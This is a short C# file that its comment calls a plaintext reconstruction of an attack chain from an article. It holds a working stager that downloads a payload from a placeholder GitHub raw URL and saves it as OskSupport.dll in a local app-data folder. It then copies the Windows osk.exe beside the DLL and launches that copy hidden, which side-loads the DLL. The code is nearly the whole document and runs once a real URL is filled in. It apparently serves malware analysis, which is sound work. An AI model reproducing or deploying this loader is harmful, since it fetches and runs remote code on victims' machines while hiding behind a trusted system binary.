using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

// Plaintext reconstruction of the cited chain: a build-time stager downloads a DLL
// into %LOCALAPPDATA%\osk and copies System32\osk.exe beside it; a control launches
// the copied host hidden. The article's strings are encrypted; the URL is a placeholder.
class Stager {
    static async Task Stage() {
        string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "osk");
        Directory.CreateDirectory(dir);
        string dllPath = Path.Combine(dir, "OskSupport.dll");
        string exePath = Path.Combine(dir, "osk.exe");
        using (var client = new HttpClient()) {
            byte[] data = await client.GetByteArrayAsync("https://raw.githubusercontent.com/example-user/example-repo/main/payload.bin");
            File.WriteAllBytes(dllPath, data);
        }
        File.Copy(Path.Combine(Environment.SystemDirectory, "osk.exe"), exePath, true);
        Process.Start(new ProcessStartInfo {
            FileName = exePath,
            UseShellExecute = true,
            WindowStyle = ProcessWindowStyle.Hidden
        });
    }
}
